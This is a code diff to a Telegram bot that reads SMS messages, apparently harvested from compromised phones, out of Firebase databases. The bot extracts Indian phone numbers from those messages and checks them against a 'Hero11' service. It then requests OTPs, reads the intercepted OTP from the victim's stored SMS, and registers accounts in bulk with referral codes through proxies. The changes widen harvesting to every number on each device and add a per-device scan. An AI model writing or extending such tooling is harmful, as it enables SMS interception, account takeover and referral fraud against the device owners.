@@ -56,6 +56,7 @@ class Form(StatesGroup):
     waiting_for_codes = State()
     waiting_for_proxies = State()
     waiting_for_check_numbers = State()
+    waiting_for_device_id = State()
 
 # ==============================================================================
 # 🛒 PROXY NORMALIZATION & HEALTH CHECKER ENGINE
@@ -194,10 +195,13 @@ def parse_firebase_links(text: str):
                 found_links.append(clean_url)
     return found_links
 
-def extract_phone(messages_dict):
+def extract_all_phones(messages_dict):
+    """Extracts ALL unique 10-digit Indian mobile numbers from a device's messages."""
+    if not messages_dict:
+        return []
     text_data = str(messages_dict)
-    match = re.search(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', text_data)
-    return match.group(1) if match else None
+    matches = re.findall(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', text_data)
+    return list(dict.fromkeys(matches))
 
 PUSH_CHARS = "-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"
 
@@ -471,9 +475,10 @@ def get_main_menu():
         [InlineKeyboardButton(text="🗑️ Clear Proxies", callback_data="clear_proxies"),
          InlineKeyboardButton(text="🟢 Check Online Devices", callback_data="check_devices")],
         [InlineKeyboardButton(text="📊 Check Number Status", callback_data="check_numbers_menu"),
-         InlineKeyboardButton(text="📋 View Active Devices & SMS", callback_data="view_active_sms")],
-        [InlineKeyboardButton(text="⚡ Check Proxy Health", callback_data="check_proxies"),
-         InlineKeyboardButton(text="🚀 Start Automation", callback_data="start_automation")]
+         InlineKeyboardButton(text="🔢 Scan All Numbers by ID", callback_data="scan_id_numbers_menu")],
+        [InlineKeyboardButton(text="📋 View Active Devices & SMS", callback_data="view_active_sms"),
+         InlineKeyboardButton(text="⚡ Check Proxy Health", callback_data="check_proxies")],
+        [InlineKeyboardButton(text="🚀 Start Automation", callback_data="start_automation")]
     ])
 
 class LiveLogger:
@@ -664,6 +669,89 @@ async def process_check_numbers_input(message: types.Message, state: FSMContext)
         reply_markup=get_main_menu()
     )
 
+@dp.callback_query(F.data == "scan_id_numbers_menu")
+async def cb_scan_id_numbers_menu(callback: types.CallbackQuery, state: FSMContext):
+    if callback.from_user.id != ADMIN_ID:
+        return
+    if not USER_DATA["firebase_dbs"]:
+        await callback.answer("❌ Please add at least one Firebase link first!", show_alert=True)
+        return
+    await state.set_state(Form.waiting_for_device_id)
+    await callback.message.answer(
+        "🔢 <b>Scan All Numbers Inside Device ID(s)</b>\n\n"
+        "Send one or more Device IDs (e.g. <code>552f6ab05a93823d</code>), or send <code>ALL</code> to scan all online IDs:"
+    )
+    await callback.answer()
+
+@dp.message(Form.waiting_for_device_id)
+async def process_device_id_scan(message: types.Message, state: FSMContext):
+    if message.from_user.id != ADMIN_ID:
+        return
+    raw_input = message.text.strip()
+    if not raw_input:
+        await message.answer("❌ Please send a Device ID or ALL:")
+        return
+
+    scan_all = raw_input.upper() == "ALL"
+    target_cids = set() if scan_all else {x.strip() for x in re.split(r'[\s,\n]+', raw_input) if x.strip()}
+
+    status_msg = await message.answer("🔍 Scanning Firebase for all numbers inside target Device ID(s)...")
+    await state.clear()
+
+    try:
+        import aiohttp
+        default_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "DEFAULT"
+        report_blocks = []
+
+        async with aiohttp.ClientSession() as session:
+            for fb_url in USER_DATA["firebase_dbs"]:
+                db_short_id = fb_url.split('//')[1].split('.')[0][:8]
+                try:
+                    cids_to_check = []
+                    if scan_all:
+                        async with session.get(f"{fb_url}clients.json", timeout=8) as r:
+                            clients_data = await r.json() or {}
+                            for cid, cdata in clients_data.items():
+                                if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
+                                    cids_to_check.append(cid)
+                    else:
+                        cids_to_check = list(target_cids)
+
+                    for cid in cids_to_check:
+                        async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=25', timeout=6) as m_req:
+                            msgs = await m_req.json()
+                            phones = extract_all_phones(msgs)
+                            if phones:
+                                num_lines = []
+                                for p in phones:
+                                    full_phone = "+91" + p
+                                    client = AsyncHero11Client(full_phone, default_code)
+                                    try:
+                                        res = await client.black_check()
+                                    finally:
+                                        await client.close()
+                                    badge = "🔴 Registered" if res == "SKIP_EXISTS" else "🟢 Unregistered"
+                                    num_lines.append(f"  • <code>{html.escape(full_phone)}</code> — {badge}")
+                                report_blocks.append(
+                                    f"🆔 <b>ID:</b> <code>{html.escape(cid)}</code> (DB: {html.escape(db_short_id)})\n" + "\n".join(num_lines)
+                                )
+                except Exception:
+                    pass
+
+        if not report_blocks:
+            await status_msg.edit_text("ℹ️ No phone numbers found for the specified Device ID(s).", reply_markup=get_main_menu())
+        else:
+            full_report = "\n\n".join(report_blocks)
+            if len(full_report) > 3900:
+                full_report = full_report[:3900] + "\n\n<i>[Truncated]</i>"
+            await status_msg.edit_text(
+                f"🔢 <b>All Numbers Found by Device ID:</b>\n\n{full_report}",
+                parse_mode="HTML",
+                reply_markup=get_main_menu()
+            )
+    except Exception as e:
+        await status_msg.edit_text(f"❌ Error scanning Device ID(s): {html.escape(str(e))}", reply_markup=get_main_menu())
+
 @dp.callback_query(F.data == "view_active_sms")
 async def cb_view_active_sms(callback: types.CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
@@ -672,7 +760,7 @@ async def cb_view_active_sms(callback: types.CallbackQuery):
         await callback.answer("❌ Please add at least one Firebase link first!", show_alert=True)
         return
 
-    status_msg = await callback.message.answer("🔍 Scanning online unregistered devices across all databases...")
+    status_msg = await callback.message.answer("🔍 Scanning all online unregistered numbers across all databases...")
 
     try:
         import aiohttp
@@ -689,10 +777,10 @@ async def cb_view_active_sms(callback: types.CallbackQuery):
                     for cid, cdata in clients_data.items():
                         if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                             try:
-                                async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=5', timeout=5) as m_req:
+                                async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=20', timeout=5) as m_req:
                                     msgs = await m_req.json()
-                                    phone = extract_phone(msgs) if msgs else None
-                                    if phone:
+                                    phones = extract_all_phones(msgs)
+                                    for phone in phones:
                                         full_phone = "+91" + phone
                                         client = AsyncHero11Client(full_phone, default_code)
                                         try:
@@ -712,22 +800,24 @@ async def cb_view_active_sms(callback: types.CallbackQuery):
                     pass
 
         if not active_devices:
-            await status_msg.edit_text("ℹ️ No active unregistered online devices found.", reply_markup=get_main_menu())
+            await status_msg.edit_text("ℹ️ No active unregistered online numbers found.", reply_markup=get_main_menu())
             await callback.answer()
             return
 
         keyboard_buttons = []
-        for dev in active_devices:
-            btn_text = f"📱 {dev['phone']} (DB: {dev['db_short']})"
-            callback_data_str = f"sms_{dev['db_short']}_{dev['cid'][:15]}"
-            keyboard_buttons.append([InlineKeyboardButton(text=btn_text, callback_data=callback_data_str)])
+        temp_map = {}
+        for idx, dev in enumerate(active_devices):
+            cb_key = f"sms_{idx}_{dev['db_short']}"
+            btn_text = f"📱 {dev['phone']} | {dev['cid'][:8]}.."
+            keyboard_buttons.append([InlineKeyboardButton(text=btn_text, callback_data=cb_key)])
+            temp_map[cb_key] = dev
 
-        USER_DATA["temp_active_devices"] = {f"sms_{dev['db_short']}_{dev['cid'][:15]}": dev for dev in active_devices}
+        USER_DATA["temp_active_devices"] = temp_map
 
         markup = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
         await status_msg.edit_text(
-            f"📋 <b>Found {len(active_devices)} Unregistered Active Device(s).</b>\n"
-            "Click any phone number below to view its live top 15 recent message history:",
+            f"📋 <b>Found {len(active_devices)} Unregistered Number(s) Across Online IDs.</b>\n"
+            "Click any number below to view its live top 15 recent message history:",
             parse_mode="HTML",
             reply_markup=markup
         )
@@ -885,7 +975,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         return
 
     USER_DATA["is_running"] = True
-    status_msg = await callback.message.answer("🚀 <b>Bulk Scan Started!</b> Targeting live online unregistered devices...", parse_mode="HTML", reply_markup=get_main_menu())
+    status_msg = await callback.message.answer("🚀 <b>Bulk Scan Started!</b> Targeting all unregistered numbers across online devices...", parse_mode="HTML", reply_markup=get_main_menu())
 
     async def run_automation():
         firebase_dbs = USER_DATA["firebase_dbs"]
@@ -911,27 +1001,26 @@ async def cb_start_automation(callback: types.CallbackQuery):
 
                             for cid, cdata in clients_data.items():
                                 if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
-                                    if cid not in skipped_phones and cid not in used_phones:
-                                        try:
-                                            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=5', timeout=5) as m_req:
-                                                msgs = await m_req.json()
-                                                phone = extract_phone(msgs) if msgs else None
-                                                if phone:
-                                                    full_phone = "+91" + phone
-                                                    if full_phone not in skipped_phones and full_phone not in used_phones:
-                                                        all_unregistered_candidates.append({
-                                                            "firebase_url": fb_url,
-                                                            "db_short_id": db_short_id,
-                                                            "cid": cid,
-                                                            "phone": full_phone
-                                                        })
-                                        except Exception:
-                                            pass
+                                    try:
+                                        async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=20', timeout=5) as m_req:
+                                            msgs = await m_req.json()
+                                            phones = extract_all_phones(msgs)
+                                            for phone in phones:
+                                                full_phone = "+91" + phone
+                                                if full_phone not in skipped_phones and full_phone not in used_phones:
+                                                    all_unregistered_candidates.append({
+                                                        "firebase_url": fb_url,
+                                                        "db_short_id": db_short_id,
+                                                        "cid": cid,
+                                                        "phone": full_phone
+                                                    })
+                                    except Exception:
+                                        pass
                         except Exception:
                             pass
 
                 if not all_unregistered_candidates:
-                    await logger.set_text("🔴 Bulk scan complete: No online unregistered devices found. Retrying in 5s...")
+                    await logger.set_text("🔴 Bulk scan complete: No online unregistered numbers found. Retrying in 5s...")
                     await asyncio.sleep(5)
                     continue
 
@@ -942,7 +1031,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                 phone = target["phone"]
                 used_phones.add(phone)
 
-                await logger.set_text(f"🎯 [DB: {db_short_id}] Phone: {phone} | Code: {current_code} | Progress: {success_count}/{total_needed}\n⏳ Requesting OTP...")
+                await logger.set_text(f"🎯 [DB: {db_short_id}] ID: {cid[:8]} | Phone: {phone} | Code: {current_code} | Progress: {success_count}/{total_needed}\n⏳ Requesting OTP...")
 
                 async with aiohttp.ClientSession() as session:
                     known_keys = set()
@@ -961,7 +1050,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                         skipped_phones.add(phone)
                         continue
 
-                    await logger.set_text(f"🎯 [DB: {db_short_id}] Phone: {phone} | Code: {current_code}\n⏳ Waiting for OTP (25s timeout)...")
+                    await logger.set_text(f"🎯 [DB: {db_short_id}] ID: {cid[:8]} | Phone: {phone} | Code: {current_code}\n⏳ Waiting for OTP (25s timeout)...")
 
                     otp_found = None
                     start_poll = time.time()
@@ -1000,7 +1089,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                     if v_res == "SUCCESS":
                         success_count += 1
                         skipped_phones.add(phone)
-                        registered_numbers.append(f"{phone} (DB: {db_short_id})")
+                        registered_numbers.append(f"{phone} (ID: {cid[:8]}, DB: {db_short_id})")
                         await logger.set_text(f"✅ [DB: {db_short_id}] SUCCESS! ({success_count}/{total_needed}) | Phone: {phone} Registered!", force=True)
                     elif v_res == "IP_LIMITED":
                         skipped_phones.add(phone)
